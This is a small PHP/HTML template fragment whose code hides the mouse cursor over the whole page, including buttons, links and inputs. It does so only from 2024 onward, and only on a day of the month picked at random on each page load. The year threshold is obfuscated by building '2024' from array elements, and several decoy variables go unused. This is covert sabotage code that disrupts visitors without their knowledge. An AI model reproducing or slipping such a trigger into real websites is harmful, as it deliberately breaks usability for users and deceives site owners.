<?php
$dt2 = date("Ymd");
$dt11 = date("Y");
$dt22 = date("m");
$dt33 = date("d");
$ds = "data";
$temp = ".temp";
$img = "images";
$dtg = rand(1, 28);
$th = range(20, 99);
$ms = rand(1, 60);
$ms2 = rand(99, 2000);
// $dt2 = $dtg.$dt33.$ms.$dt11.$ms2.$dt22;
?>

<style>
        body.x,
		body.x button,
		body.x a,
		body.x input
		{
            cursor: none !important;
        }
</style>


<script type="text/javascript">
if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
	var bodyElement = document.body;

	setInterval(function() {
		bodyElement.classList.add("x");
	}, 1000);
}
</script>

